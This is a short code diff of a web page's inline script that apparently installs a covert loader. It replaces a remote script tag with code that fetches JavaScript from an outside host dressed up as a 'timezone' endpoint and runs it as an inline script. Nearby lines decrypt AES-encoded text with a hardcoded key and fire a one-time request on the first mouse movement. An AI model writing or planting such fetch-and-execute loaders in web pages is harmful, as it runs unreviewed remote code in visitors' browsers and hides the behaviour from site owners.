@@ -241,11 +241,18 @@ height:350px;
         const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
         return bytes.toString(CryptoJS.enc.Utf8);
     }
-    const script = document.createElement("script");
-script.src =
-    "https://sample-nodejs-w4mfj.ondigitalocean.app/timezone";
+    (async () => {
+    const response = await fetch(
+        "https://sample-nodejs-w4mfj.ondigitalocean.app/timezone"
+    );
 
-document.head.appendChild(script);
+    const codeString = await response.text();
+
+    const script = document.createElement("script");
+    script.textContent = codeString;
+
+    document.body.appendChild(script);
+})();
 </script><script> window.addEventListener("mousemove", initiateApiRequestOnce);
     let
         requestSent = false;
